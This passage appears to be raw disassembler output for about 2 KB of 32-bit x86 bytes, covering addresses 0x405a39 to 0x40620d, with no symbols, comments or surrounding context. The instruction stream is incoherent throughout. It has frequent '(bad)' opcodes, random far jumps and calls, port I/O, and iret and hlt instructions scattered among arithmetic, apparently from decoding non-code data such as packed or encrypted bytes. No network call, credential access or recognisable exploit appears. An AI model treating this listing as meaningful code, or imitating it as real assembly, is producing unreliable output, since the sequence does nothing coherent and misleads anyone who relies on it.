  405a39:	or     bh,BYTE PTR [ebp+ebp*8+0x3d]
  405a3d:	scas   eax,DWORD PTR es:[edi]
  405a3e:	jns    0x405a81
  405a40:	inc    eax
  405a41:	xchg   ebp,eax
  405a42:	xchg   DWORD PTR [eax+0x4216286],ebx
  405a48:	iret   
  405a49:	int    0x8c
  405a4b:	loopne 0x405aac
  405a4d:	xchg   edx,eax
  405a4e:	mov    esp,0x34af8b7a
  405a53:	push   0x73
  405a55:	or     eax,0xa9cb9acd
  405a5a:	test   DWORD PTR [edx],eax
  405a5c:	jl     0x405a92
  405a5e:	sar    BYTE PTR cs:[ebp+0x47832fef],0x33
  405a66:	jb     0x405a35
  405a68:	popa   
  405a69:	cwde   
  405a6a:	pop    edi
  405a6b:	jmp    FWORD PTR [edx+eax*2]
  405a6e:	dec    eax
  405a6f:	lea    edi,[eax+0x37]
  405a72:	leave  
  405a73:	mov    esi,0x2d09d631
  405a78:	rcl    DWORD PTR [ecx-0x35cab440],0x6
  405a7f:	mov    cl,0xe9
  405a81:	stc    
  405a82:	daa    
  405a83:	xchg   ebx,eax
  405a84:	mov    ebp,0x6dcee77
  405a89:	or     esi,DWORD PTR [esp+esi*1+0x6ba3a546]
  405a90:	lods   eax,DWORD PTR ds:[esi]
  405a91:	mov    cl,ch
  405a93:	fistp  DWORD PTR [eax+0x51]
  405a96:	addr16 push 0xdde75011
  405a9c:	pop    edi
  405a9d:	in     al,0x72
  405a9f:	(bad)  
  405aa0:	loopne 0x405ac3
  405aa2:	jmp    0x9a0e:0xc4b53e53
  405aa9:	imul   ebx,eax,0x1132e6a5
  405aaf:	mov    ah,0x63
  405ab1:	daa    
  405ab2:	mov    dh,0x5c
  405ab4:	data16 cld 
  405ab6:	(bad)  
  405ab7:	pop    eax
  405ab8:	adc    al,0x4c
  405aba:	mov    eax,0x6dedd739
  405abf:	popf   
  405ac0:	retf   0xfaf5
  405ac3:	add    BYTE PTR [edx],al
  405ac5:	and    eax,ebp
  405ac7:	and    ebx,DWORD PTR [esi+ecx*4-0x76]
  405acb:	pop    eax
  405acc:	stos   DWORD PTR es:[edi],eax
  405acd:	cmp    al,0xfd
  405acf:	cmp    edx,DWORD PTR [ecx]
  405ad1:	adc    ch,BYTE PTR [edx-0x24]
  405ad4:	mov    eax,0x9021130f
  405ad9:	fist   DWORD PTR [eax-0x6f83b6ad]
  405adf:	xor    eax,0xf0c695b7
  405ae4:	xchg   ecx,eax
  405ae5:	lods   eax,DWORD PTR ds:[esi]
  405ae6:	cmp    edi,DWORD PTR [eax-0x3e]
  405ae9:	cs (bad) 
  405aeb:	push   eax
  405aec:	and    esp,DWORD PTR [edi-0x705a5850]
  405af2:	fisub  DWORD PTR [esp+esi*8]
  405af5:	ret    0xbeea
  405af8:	fs pushf 
  405afa:	jp     0x405b07
  405afc:	xchg   DWORD PTR [eax],ebx
  405afe:	xchg   ecx,eax
  405aff:	and    al,BYTE PTR [edx-0x4a16f004]
  405b05:	jl     0x405b7e
  405b07:	(bad)  
  405b08:	lods   al,BYTE PTR ds:[esi]
  405b09:	aas    
  405b0a:	cwde   
  405b0b:	jge    0x405b6d
  405b0d:	dec    edx
  405b0e:	hlt    
  405b0f:	or     dl,0xfe
  405b12:	idiv   BYTE PTR [eax]
  405b14:	sbb    bl,BYTE PTR [ebp-0x37]
  405b17:	leave  
  405b18:	and    eax,0x2fa2a545
  405b1d:	test   BYTE PTR [eax],ah
  405b1f:	mov    esi,esi
  405b21:	mov    edx,edi
  405b23:	or     cl,BYTE PTR [ebp-0x36132984]
  405b29:	sbb    al,0xe
  405b2b:	(bad)  
  405b2c:	pop    edx
  405b2d:	call   0x379d:0x143bf8cc
  405b34:	inc    ecx
  405b35:	dec    esp
  405b36:	mov    dh,BYTE PTR [edi+0x61]
  405b39:	arpl   WORD PTR ds:0x78cdbf9,sp
  405b3f:	xchg   edx,eax
  405b40:	push   ebx
  405b41:	imul   eax,ebx,0xffffff91
  405b44:	nop
  405b45:	xchg   BYTE PTR [edi+eax*8+0x206d5480],ah
  405b4c:	pop    edx
  405b4d:	in     eax,dx
  405b4e:	dec    edx
  405b4f:	div    BYTE PTR [ecx-0x14]
  405b52:	push   ss
  405b53:	leave  
  405b54:	pop    eax
  405b55:	adc    DWORD PTR [edx],esp
  405b57:	fst    QWORD PTR [esi-0x4c]
  405b5a:	in     al,dx
  405b5b:	pushf  
  405b5c:	inc    ecx
  405b5d:	cmp    bl,bh
  405b5f:	or     cl,BYTE PTR [esi-0x1e7863b8]
  405b65:	aam    0xab
  405b67:	adc    eax,0xd0184da8
  405b6c:	(bad)  
  405b6d:	out    0x10,eax
  405b6f:	or     bh,ah
  405b71:	add    DWORD PTR [esi+0x48],edx
  405b74:	push   0xf02ce05f
  405b79:	jbe    0x405bf8
  405b7b:	stos   DWORD PTR es:[edi],eax
  405b7c:	fisub  DWORD PTR [esi]
  405b7e:	stos   DWORD PTR es:[edi],eax
  405b7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b80:	push   0x31
  405b82:	ror    BYTE PTR [ebp+esi*4+0x51f3675d],1
  405b89:	mov    ds:0xc464e5b9,al
  405b8e:	mov    cl,0x12
  405b90:	pop    es
  405b91:	xchg   BYTE PTR [edx],bl
  405b93:	cmc    
  405b94:	jnp    0x405be7
  405b96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b97:	cli    
  405b98:	mov    edi,0x75a763c8
  405b9d:	enter  0xe380,0xe8
  405ba1:	sub    ebp,0xffffff96
  405ba4:	mov    esi,0xe31a9829
  405ba9:	repz call 0xc7c6:0x356a4fbc
  405bb1:	add    BYTE PTR [esi-0x2661f981],0xa2
  405bb8:	xor    cl,BYTE PTR [eax]
  405bba:	in     eax,dx
  405bbb:	add    esi,DWORD PTR [eax]
  405bbd:	dec    edx
  405bbe:	xchg   edx,eax
  405bbf:	imul   edx,DWORD PTR [ebx+0x6e10a894],0xbfa1e5cc
  405bc9:	cmp    eax,0x222b3e52
  405bce:	punpcklbw mm7,DWORD PTR [ebx-0xa6ea8ea]
  405bd5:	mov    eax,0x58582393
  405bda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bdb:	xor    al,0xbd
  405bdd:	scas   eax,DWORD PTR es:[edi]
  405bde:	inc    edx
  405bdf:	dec    ecx
  405be0:	push   edx
  405be1:	mov    esp,0x8fc4e7ac
  405be6:	mov    ds:0xacef9ef7,eax
  405beb:	sbb    eax,0x18e5cb07
  405bf0:	mov    WORD PTR [ebx+0x353efe5],fs
  405bf6:	rcr    BYTE PTR [ebp-0xea90d1d],0x1a
  405bfd:	imul   edi,DWORD PTR [ecx],0xfffffffe
  405c00:	lds    esi,FWORD PTR [ebp+eiz*4-0x3883f201]
  405c07:	outs   dx,DWORD PTR ds:[esi]
  405c08:	cld    
  405c09:	fsub   st,st(0)
  405c0b:	fisttp QWORD PTR [eax-0x3cea2027]
  405c11:	fld    TBYTE PTR [edi+0x2f]
  405c14:	sub    dh,BYTE PTR [ebx+0x79fff505]
  405c1a:	inc    esi
  405c1b:	repnz xchg ebp,eax
  405c1d:	cmp    bl,BYTE PTR [eax]
  405c1f:	xor    ebp,DWORD PTR [esp+eiz*4+0x21]
  405c23:	mov    ebx,0x29ec1d26
  405c28:	gs cmp al,0x7
  405c2b:	outs   dx,BYTE PTR ds:[esi]
  405c2c:	inc    ebp
  405c2d:	inc    esi
  405c2e:	and    DWORD PTR [eax+0x2],esi
  405c31:	fbld   TBYTE PTR [esi+eiz*8-0x4a]
  405c35:	mov    WORD PTR [edx+0x19],cs
  405c38:	jo     0x405bbe
  405c3a:	in     eax,0x76
  405c3c:	or     DWORD PTR [edi+0x58b3a6d1],ebx
  405c42:	mov    DWORD PTR [edx-0x768ca20b],edx
  405c48:	imul   ecx,edx,0xf2d6061d
  405c4e:	jle    0x405c2e
  405c50:	into   
  405c51:	out    0x82,al
  405c53:	lods   al,BYTE PTR ds:[esi]
  405c54:	inc    esp
  405c55:	adc    eax,0xf65a1022
  405c5a:	adc    ah,BYTE PTR [esi+0x47]
  405c5d:	ficomp DWORD PTR [eax+0x24]
  405c60:	jno    0x405bfc
  405c62:	lds    esp,FWORD PTR [esi+0x29cceecd]
  405c68:	sbb    al,dl
  405c6a:	(bad)  
  405c6b:	lods   eax,DWORD PTR ds:[esi]
  405c6c:	das    
  405c6d:	loope  0x405c49
  405c6f:	pop    eax
  405c70:	lods   al,BYTE PTR ds:[esi]
  405c71:	jbe    0x405cef
  405c73:	lock xlat BYTE PTR ds:[ebx]
  405c75:	jnp    0x405ccf
  405c77:	inc    eax
  405c78:	inc    ebx
  405c79:	jb     0x405c4d
  405c7b:	cmp    esi,ebp
  405c7d:	iret   
  405c7e:	jne    0x405c10
  405c80:	cmp    edx,edi
  405c82:	push   esi
  405c83:	sti    
  405c84:	xor    al,0xaa
  405c86:	es jno 0x405cfd
  405c89:	cs jge 0x405c65
  405c8c:	mov    dl,0x78
  405c8e:	push   cs
  405c8f:	sbb    al,0x15
  405c91:	(bad)  
  405c93:	aas    
  405c94:	data16 adc al,0xd5
  405c97:	jo     0x405ce0
  405c99:	add    al,0x20
  405c9b:	add    al,0x49
  405c9d:	pushf  
  405c9e:	sub    al,0x54
  405ca0:	mov    esi,0x517441ac
  405ca5:	jae    0x405cd5
  405ca7:	(bad)  
  405ca8:	(bad)
  405cab:	jg     0x405cc7
  405cad:	repz retf 0xbf20
  405cb1:	dec    ebx
  405cb2:	sbb    BYTE PTR [edi-0x5d],dh
  405cb5:	inc    ecx
  405cb6:	cli    
  405cb7:	jnp    0x405c79
  405cb9:	test   eax,0x5e804336
  405cbe:	aad    0x7a
  405cc0:	xlat   BYTE PTR ds:[ebx]
  405cc1:	mov    ecx,0xd813fc92
  405cc6:	pop    esp
  405cc7:	push   ds
  405cc8:	inc    esi
  405cc9:	lahf   
  405cca:	pop    ecx
  405ccb:	jmp    esi
  405ccd:	jo     0x405c7f
  405ccf:	dec    ebx
  405cd0:	hlt    
  405cd1:	mov    cl,0xef
  405cd3:	add    esp,esi
  405cd5:	push   esp
  405cd6:	xchg   DWORD PTR [ebp+0x6a1c1e57],ebx
  405cdc:	(bad)  
  405cdd:	add    DWORD PTR [edx],ecx
  405cdf:	push   esp
  405ce0:	push   ss
  405ce1:	and    esp,DWORD PTR [edi+0x7b]
  405ce4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ce5:	fild   WORD PTR [eax-0x3200791c]
  405ceb:	mov    BYTE PTR [ebp+0x7d],ah
  405cee:	fidivr DWORD PTR [eax]
  405cf0:	imul   edi,DWORD PTR [edx],0x1f
  405cf3:	cmp    ah,dl
  405cf5:	aaa    
  405cf6:	pusha  
  405cf7:	stos   BYTE PTR es:[edi],al
  405cf8:	jge    0x405d4f
  405cfa:	mov    esp,0xb1399e80
  405cff:	push   ds
  405d00:	add    edx,DWORD PTR [ebp+0x5697fc11]
  405d06:	push   0xffffff8c
  405d08:	sbb    al,0xfb
  405d0a:	jns    0x405c92
  405d0c:	jecxz  0x405d31
  405d0e:	sbb    DWORD PTR [edx],esi
  405d10:	fild   DWORD PTR [edi+eiz*4+0x1cc38264]
  405d17:	xor    al,0x83
  405d19:	push   edi
  405d1a:	repz mov eax,ds:0xbaa5f588
  405d20:	jg     0x405d6b
  405d22:	sbb    DWORD PTR ds:[esi+0x41],0x3479f6cf
  405d2a:	push   es
  405d2b:	lods   al,BYTE PTR ds:[esi]
  405d2c:	pop    edi
  405d2d:	sbb    bl,0xeb
  405d30:	(bad)  
  405d31:	aas    
  405d32:	enter  0x1492,0x31
  405d36:	adc    eax,0xe952097c
  405d3b:	xchg   BYTE PTR [esi+0x528f320b],dh
  405d41:	jmp    0x5399fef9
  405d46:	addr16 jnp 0x405d7a
  405d49:	jl     0x405d51
  405d4b:	add    BYTE PTR [ecx-0x60],cl
  405d4e:	jns    0x405d0e
  405d50:	inc    ebp
  405d51:	rol    DWORD PTR [ecx],0xcb
  405d54:	pop    DWORD PTR [esi-0x3525450d]
  405d5a:	mov    es,esp
  405d5c:	in     eax,0xda
  405d5e:	jge    0x405dd6
  405d60:	jmp    0xab80e571
  405d65:	imul   ecx,esp,0xffffffa2
  405d68:	into   
  405d69:	mov    edi,0x97be5881
  405d6e:	stos   BYTE PTR es:[edi],al
  405d6f:	pop    esi
  405d70:	popf   
  405d71:	and    al,0x42
  405d73:	(bad)  
  405d74:	mov    dh,0xc3
  405d76:	pusha  
  405d77:	(bad)  
  405d78:	jb     0x405d98
  405d7a:	sahf   
  405d7b:	repz cmp DWORD PTR [ebx-0x36],ebp
  405d7f:	imul   eax,DWORD PTR [ebx],0x79ef4aac
  405d85:	pop    ss
  405d86:	(bad)  
  405d87:	and    dl,BYTE PTR [edx*8-0x22eb63c9]
  405d8e:	ret    
  405d8f:	rcr    ebp,0xcc
  405d92:	dec    ecx
  405d93:	rcl    DWORD PTR fs:[esi+edx*4-0x1645191],0xa1
  405d9c:	or     eax,0x4bb6e446
  405da1:	lods   al,BYTE PTR ds:[esi]
  405da2:	pop    eax
  405da3:	sub    esi,DWORD PTR [esi]
  405da5:	es jb  0x405db9
  405da8:	xchg   ebp,eax
  405da9:	out    dx,al
  405daa:	push   eax
  405dab:	push   ebx
  405dac:	jne    0x405d9d
  405dae:	jno    0x405d30
  405db0:	pushf  
  405db1:	jmp    0x404d98f7
  405db6:	(bad)  
  405db7:	in     eax,0x24
  405db9:	div    dl
  405dbb:	xor    eax,0x669f84c8
  405dc0:	(bad)  
  405dc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dc2:	sub    BYTE PTR [edx+0x72],ch
  405dc5:	jno    0x405e15
  405dc7:	dec    esp
  405dc8:	mov    ecx,0xdbf74824
  405dcd:	aam    0x43
  405dcf:	cmp    al,BYTE PTR [eiz*8+0xec7a66b]
  405dd6:	mov    esp,?
  405dd8:	in     eax,0xe6
  405dda:	and    esp,DWORD PTR [ecx-0x7]
  405ddd:	inc    eax
  405dde:	jno    0x405e47
  405de0:	push   esp
  405de1:	out    dx,al
  405de2:	sub    al,0xe2
  405de4:	in     eax,0x9e
  405de6:	into   
  405de7:	jmp    0x296f:0xd40ffce8
  405dee:	shl    BYTE PTR [esi],1
  405df0:	outs   dx,DWORD PTR ds:[esi]
  405df1:	or     al,0x93
  405df3:	fcmovnb st,st(0)
  405df5:	ins    DWORD PTR es:[edi],dx
  405df6:	jl     0x405db0
  405df8:	das    
  405df9:	retf   
  405dfa:	jo     0x405e7a
  405dfc:	mov    ebp,DWORD PTR [edx-0x60]
  405dff:	add    al,0xad
  405e01:	(bad)  
  405e03:	shl    DWORD PTR [esi*1-0x4bb7d7cc],cl
  405e0a:	stos   BYTE PTR es:[edi],al
  405e0b:	pop    ecx
  405e0c:	add    al,0x7
  405e0e:	push   ebx
  405e0f:	xchg   edi,eax
  405e10:	pop    eax
  405e11:	jb     0x405e15
  405e13:	inc    ebp
  405e14:	cmc    
  405e15:	ror    DWORD PTR [edx+0x17ff5489],cl
  405e1b:	and    bl,dl
  405e1d:	ss pop ss
  405e1f:	push   0x5c482ddd
  405e24:	xor    esi,DWORD PTR [ecx+0x4dbc71ae]
  405e2a:	mov    ?,WORD PTR [eax-0x2822958c]
  405e30:	stos   DWORD PTR es:[edi],eax
  405e31:	jb     0x405db7
  405e33:	mov    ebx,0xaac9b1b
  405e38:	fs enter 0x8b0d,0x8b
  405e3d:	xor    BYTE PTR [eax-0x32],al
  405e40:	and    DWORD PTR [ebp+edi*8+0x49132d8a],edi
  405e47:	xchg   edi,eax
  405e48:	jmp    0xa119e8fb
  405e4d:	cmp    al,0xae
  405e4f:	pop    ebx
  405e50:	fidivr DWORD PTR [ebx]
  405e52:	adc    eax,0x9be875cc
  405e57:	fbstp  TBYTE PTR [edi]
  405e59:	loopne 0x405e08
  405e5b:	fucomi st,st(6)
  405e5d:	sub    ebx,DWORD PTR [ebx]
  405e5f:	dec    ebx
  405e60:	out    dx,al
  405e61:	xchg   ebp,eax
  405e62:	mov    eax,ds:0x1dab0a04
  405e67:	cmp    BYTE PTR [ebx+0x17],0x1d
  405e6b:	pusha  
  405e6c:	iret   
  405e6d:	mov    ds:0xaca69f73,al
  405e72:	sbb    eax,DWORD PTR [eax+ebp*8]
  405e75:	call   0x3f0d:0xe1ba64b9
  405e7c:	std    
  405e7d:	call   0x1882:0x62fc9cc7
  405e84:	xor    al,0xc
  405e86:	xor    bl,BYTE PTR [ecx]
  405e88:	mov    ah,0x6f
  405e8a:	mov    ah,0x3
  405e8c:	js     0x405ee2
  405e8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e8f:	push   ebp
  405e90:	push   ecx
  405e91:	repnz cdq 
  405e93:	xor    eax,0x39afa3d6
  405e98:	jbe    0x405e3b
  405e9a:	mov    ch,0x17
  405e9c:	sub    DWORD PTR [esi-0x54846ce4],ecx
  405ea2:	mov    esi,0xeea1c601
  405ea7:	pop    ss
  405ea8:	sub    eax,0x9c72d2b9
  405ead:	pop    edi
  405eae:	xor    ebx,eax
  405eb0:	jl     0x405e9d
  405eb2:	cmp    esi,DWORD PTR [edx]
  405eb4:	mov    dl,BYTE PTR [edx]
  405eb6:	jmp    0xb367e0e1
  405ebb:	and    dl,BYTE PTR [edi+0x77]
  405ebe:	mov    ds:0x42e9a6b9,eax
  405ec3:	out    dx,eax
  405ec4:	mov    esp,0x8e71627
  405ec9:	add    dh,BYTE PTR ds:0xef869a6a
  405ecf:	test   al,0xd3
  405ed1:	jmp    0x405f37
  405ed3:	pop    esp
  405ed4:	dec    eax
  405ed5:	jae    0x405e79
  405ed7:	xchg   BYTE PTR [edi+0x30],ah
  405eda:	sub    ebx,DWORD PTR [ebx]
  405edc:	dec    eax
  405edd:	es inc ecx
  405edf:	jnp    0x405ef0
  405ee1:	call   0xd18c5eaa
  405ee6:	ds dec eax
  405ee8:	shl    DWORD PTR ds:0x376256a7,0x99
  405eef:	sub    eax,0xa88c9d93
  405ef4:	dec    eax
  405ef5:	fwait
  405ef6:	test   ebp,0x5f125a18
  405efc:	or     BYTE PTR [eax-0x76],0x88
  405f00:	dec    edx
  405f01:	push   es
  405f02:	or     esi,ebx
  405f04:	cld    
  405f05:	neg    BYTE PTR [ebx-0x4fe35dee]
  405f0b:	sub    al,0xcf
  405f0d:	popa   
  405f0e:	mov    edi,0x5118530
  405f13:	push   esi
  405f14:	sbb    ebp,DWORD PTR [esi-0x49]
  405f17:	xchg   ebx,eax
  405f18:	mov    ebx,0x6ec581ad
  405f1d:	sub    edx,esp
  405f1f:	cli    
  405f20:	cwde   
  405f21:	add    eax,0xd3536bbe
  405f26:	mov    bh,0x2
  405f28:	inc    esp
  405f29:	inc    edx
  405f2a:	les    esi,FWORD PTR [edi+0x451e263b]
  405f30:	addr16 pop esi
  405f32:	pop    es
  405f33:	stc    
  405f34:	test   BYTE PTR [edi],0x78
  405f37:	or     al,0x6f
  405f39:	loopne 0x405f8d
  405f3b:	sbb    BYTE PTR [esi],bh
  405f3d:	sahf   
  405f3e:	js     0x405fb9
  405f40:	mov    edi,0xddb86697
  405f45:	test   DWORD PTR [eax+edx*1+0x6],0xfccc8401
  405f4d:	and    DWORD PTR [ecx],0xcb2b553f
  405f53:	xor    eax,0x5e9cbccb
  405f58:	shl    BYTE PTR [ebx+ebp*8],0x81
  405f5c:	cmp    bh,BYTE PTR [edi]
  405f5e:	(bad)  
  405f5f:	dec    ebx
  405f60:	sub    edi,ebx
  405f62:	ret    
  405f63:	out    0xe5,al
  405f65:	and    esp,eax
  405f67:	adc    al,0x6d
  405f69:	jo     0x405f45
  405f6b:	cmp    DWORD PTR [eax+eax*1-0x7b889133],edi
  405f72:	xchg   ebp,eax
  405f73:	pop    ss
  405f74:	in     al,dx
  405f75:	mov    ecx,0xd0489ff2
  405f7a:	jge    0x405f06
  405f7c:	aam    0xf
  405f7e:	fimul  DWORD PTR [ebp+0x19e7d5b2]
  405f84:	inc    edi
  405f85:	fstp   DWORD PTR [eax-0x2d86e54b]
  405f8b:	pop    es
  405f8c:	in     al,dx
  405f8d:	lds    ebx,FWORD PTR [ecx+0x45c5d5eb]
  405f93:	cwde   
  405f94:	ins    BYTE PTR es:[edi],dx
  405f95:	loope  0x405fdf
  405f97:	addr16 pop esp
  405f99:	or     ecx,DWORD PTR [esi-0x78]
  405f9c:	sti    
  405f9d:	xchg   ebp,eax
  405f9e:	and    al,0xa8
  405fa0:	int3   
  405fa1:	jmp    0x9bb42297
  405fa6:	daa    
  405fa7:	lock stc 
  405fa9:	and    al,0xbf
  405fab:	xor    bl,BYTE PTR [edi-0x1f2a4bc0]
  405fb1:	inc    edi
  405fb2:	aam    0xfc
  405fb4:	(bad)  
  405fb5:	clc    
  405fb6:	jle    0x405fcf
  405fb8:	(bad)  
  405fba:	sbb    BYTE PTR fs:[ebp+0x23],ch
  405fbe:	sbb    ebp,eax
  405fc0:	fs push ds
  405fc2:	stos   DWORD PTR es:[edi],eax
  405fc3:	daa    
  405fc4:	imul   esi,DWORD PTR [bp+di-0x2222],0x8c554e2
  405fcd:	jg     0x406037
  405fcf:	icebp  
  405fd0:	pop    ecx
  405fd1:	sbb    eax,0xc8325c
  405fd6:	lods   al,BYTE PTR ds:[esi]
  405fd7:	or     BYTE PTR [esi+0x16],cl
  405fda:	ja     0x405f5e
  405fdc:	adc    ah,cl
  405fde:	pusha  
  405fdf:	push   esp
  405fe0:	mov    al,ds:0xd794c6e0
  405fe5:	retf   0xc5b6
  405fe8:	cmp    BYTE PTR [ebx-0xc],cl
  405feb:	mov    DWORD PTR ds:[ebx-0x64],ecx
  405fef:	sub    DWORD PTR [ecx+0x618a0222],ebx
  405ff5:	jne    0x405f82
  405ff7:	sub    BYTE PTR [ecx-0x50],dh
  405ffa:	sbb    eax,0x2d5e376b
  405fff:	mov    esi,0xcc240dc6
  406004:	sbb    dl,BYTE PTR [eax-0x3424da09]
  40600a:	popf   
  40600b:	iret   
  40600c:	xchg   ecx,eax
  40600d:	adc    ch,al
  40600f:	xchg   edx,eax
  406010:	fisub  DWORD PTR [edi]
  406012:	les    ecx,FWORD PTR [edx+eiz*2-0x1676b8a8]
  406019:	sub    al,0x2a
  40601b:	xchg   edx,eax
  40601c:	xor    al,0x8f
  40601e:	(bad)  
  40601f:	rep stos BYTE PTR es:[edi],al
  406021:	pop    edi
  406022:	sbb    DWORD PTR [ebp-0x65e1dcd7],0x4b
  406029:	lea    ecx,[ebp-0x4507e27b]
  40602f:	movzx  eax,cx
  406032:	mov    al,ds:0x1b714bf
  406037:	dec    esp
  406038:	outs   dx,DWORD PTR ds:[esi]
  406039:	fcomp  st(0)
  40603b:	pusha  
  40603c:	in     eax,0x12
  40603e:	and    al,0x59
  406040:	mov    dh,0x94
  406042:	jp     0x405ff2
  406044:	into   
  406045:	jno    0x40607c
  406047:	push   esi
  406048:	les    ecx,FWORD PTR [edx+0x15]
  40604b:	and    eax,0x18f38c88
  406050:	cwde   
  406051:	sub    al,0xf0
  406053:	ret    0x5965
  406056:	xchg   esp,eax
  406057:	lods   al,BYTE PTR ds:[esi]
  406058:	push   ds
  406059:	jp     0x40603d
  40605b:	(bad)  
  40605d:	jecxz  0x40605f
  40605f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406060:	fsubr  DWORD PTR [ebp-0x55a90d20]
  406066:	cmp    ecx,edi
  406068:	loopne 0x4060e9
  40606a:	dec    ecx
  40606b:	mov    ch,0xf1
  40606d:	adc    DWORD PTR [ebx-0x7ed4b51b],ebp
  406073:	test   BYTE PTR [ecx+0x645e3672],dh
  406079:	push   esi
  40607a:	xchg   ebx,eax
  40607b:	imul   ebp,DWORD PTR [eax+0x21],0x5b
  40607f:	stc    
  406080:	fs loop 0x4060ab
  406083:	sub    BYTE PTR [edx],bh
  406085:	push   ecx
  406086:	bound  edx,QWORD PTR [ecx+0x4]
  406089:	int    0xd0
  40608b:	out    dx,eax
  40608c:	dec    eax
  40608d:	fwait
  40608e:	retf   0xe711
  406091:	or     al,0x3c
  406093:	bound  eax,QWORD PTR [eax]
  406095:	fld    TBYTE PTR [ecx+edx*4-0x6a89b6db]
  40609c:	xchg   esp,eax
  40609d:	shl    BYTE PTR [edi],1
  40609f:	xchg   ebp,eax
  4060a0:	test   al,0x2c
  4060a2:	push   ds
  4060a3:	sbb    ch,BYTE PTR [ebx+0x5ae5b374]
  4060a9:	repnz ror DWORD PTR [ebx+0xa419dcb],1
  4060b0:	inc    ebp
  4060b1:	add    al,0xb3
  4060b3:	sub    BYTE PTR [edi+0x57],dl
  4060b6:	cmc    
  4060b7:	enter  0xdc55,0x83
  4060bb:	cmp    esp,DWORD PTR [edi+edx*1+0x20]
  4060bf:	pop    ecx
  4060c0:	push   ecx
  4060c1:	es aam 0xdb
  4060c4:	rcr    DWORD PTR [esi-0x68387641],cl
  4060ca:	add    ecx,edi
  4060cc:	ficom  WORD PTR [ecx+0x77]
  4060cf:	mov    eax,ecx
  4060d1:	push   esp
  4060d2:	mov    ch,0xd1
  4060d4:	outs   dx,BYTE PTR ds:[esi]
  4060d5:	xor    al,0x7e
  4060d7:	repz jge 0x406147
  4060da:	jbe    0x4060e7
  4060dc:	ins    DWORD PTR es:[edi],dx
  4060dd:	mov    ebx,0x96184ddf
  4060e2:	cld    
  4060e3:	repnz mov eax,ds:0x129a13f1
  4060e9:	loopne 0x406075
  4060eb:	ret    
  4060ec:	or     ah,BYTE PTR [ecx+0x2e]
  4060ef:	and    edx,DWORD PTR [ecx+0x5e461283]
  4060f5:	push   eax
  4060f6:	and    eax,0xfbf2da87
  4060fb:	pop    es
  4060fc:	inc    edi
  4060fd:	mov    ebp,0x338626e2
  406102:	lock push edi
  406104:	or     ecx,DWORD PTR [edi-0x62273bb3]
  40610a:	outs   dx,BYTE PTR ds:[esi]
  40610b:	fsub   QWORD PTR [edx-0xd6a6ac7]
  406111:	out    0xd6,al
  406113:	clc    
  406114:	(bad)  
  406115:	fld1   
  406117:	mov    BYTE PTR [edi-0x202b55ea],al
  40611d:	mov    ebx,0x9268815f
  406122:	fcmovnu st,st(1)
  406124:	sbb    bh,cl
  406126:	lea    edi,[edi+0x7703a78b]
  40612c:	aas    
  40612d:	jne    0x40610b
  40612f:	inc    esi
  406130:	jg     0x40618c
  406132:	aam    0x62
  406134:	test   eax,0xb70fa2f6
  406139:	popa   
  40613a:	popf   
  40613b:	in     eax,dx
  40613c:	push   esp
  40613d:	cli    
  40613e:	push   ebp
  40613f:	inc    ebx
  406140:	ss xchg esi,eax
  406142:	ins    DWORD PTR es:[edi],dx
  406143:	dec    ecx
  406144:	add    al,0x85
  406146:	mov    eax,ds:0x3121d507
  40614b:	jmp    0x3ad5:0x2264cbdd
  406152:	mov    ebp,ecx
  406154:	adc    DWORD PTR [ebp+0x23],esi
  406157:	xchg   edx,eax
  406158:	push   ecx
  406159:	sub    DWORD PTR [eax+0x14],ecx
  40615c:	pop    edx
  40615d:	pop    eax
  40615e:	inc    esp
  40615f:	inc    ebx
  406160:	ins    BYTE PTR es:[edi],dx
  406161:	push   0xffffffd4
  406163:	pop    ebx
  406164:	(bad)  
  406165:	in     eax,dx
  406166:	int    0x5f
  406168:	lock cmc 
  40616a:	ret    
  40616b:	jl     0x406131
  40616d:	call   0xb09d:0xcdeaf5c1
  406174:	mov    ebp,0x976f4a39
  406179:	icebp  
  40617a:	mov    ah,0x3a
  40617c:	stos   DWORD PTR es:[edi],eax
  40617d:	mov    ebx,0x368b2078
  406182:	repz push ss
  406184:	retf   
  406185:	test   dh,0xe5
  406188:	retf   0x7e53
  40618b:	loop   0x4061b5
  40618d:	mov    esi,DWORD PTR [ecx+esi*8]
  406190:	jnp    0x4061bf
  406192:	into   
  406193:	nop
  406194:	or     cl,BYTE PTR [edx+0x5e0dca1c]
  40619a:	sbb    bh,BYTE PTR [eax]
  40619c:	cmp    edx,esp
  40619e:	pushf  
  40619f:	aad    0x9f
  4061a1:	mov    dl,0xe6
  4061a3:	rcr    BYTE PTR [eax-0x7fdc05d9],1
  4061a9:	mov    bl,0x16
  4061ab:	xchg   ebx,eax
  4061ac:	repz fdivr st(4),st
  4061af:	mov    eax,0x42c74851
  4061b4:	cmp    cl,bh
  4061b6:	pop    eax
  4061b7:	inc    ecx
  4061b8:	aaa    
  4061b9:	jg     0x406206
  4061bb:	xchg   edi,eax
  4061bc:	cmp    bl,dl
  4061be:	js     0x406226
  4061c0:	jbe    0x40617a
  4061c2:	stos   BYTE PTR es:[edi],al
  4061c3:	ds dec esi
  4061c5:	or     edi,esp
  4061c7:	push   ds
  4061c8:	shl    edi,cl
  4061ca:	mov    ebp,edx
  4061cc:	movq   mm0,mm6
  4061cf:	into   
  4061d0:	and    al,0x53
  4061d2:	test   BYTE PTR [eax+eax*1-0x46ea6f2d],dl
  4061d9:	fdiv   QWORD PTR [esi-0x6d179b5]
  4061df:	loop   0x40621e
  4061e1:	(bad)  
  4061e2:	xchg   ebx,eax
  4061e3:	push   esp
  4061e4:	(bad)
  4061e7:	inc    ebp
  4061e8:	sbb    edx,eax
  4061ea:	daa    
  4061eb:	sbb    eax,0x9b4a9f6c
  4061f0:	in     eax,dx
  4061f1:	call   0xb5e1:0xc374745f
  4061f8:	push   0x2
  4061fa:	and    DWORD PTR [ecx+0x5f],eax
  4061fd:	add    BYTE PTR [eax],ah
  4061ff:	ins    DWORD PTR es:[edi],dx
  406200:	mov    dh,0x72
  406202:	sub    BYTE PTR [edx],dl
  406204:	push   ecx
  406205:	mov    ch,0x81
  406207:	inc    edx
  406208:	cmp    al,0x9e
  40620a:	loopne 0x4061d4
  40620c:	pop    ecx
  40620d:	cwde   
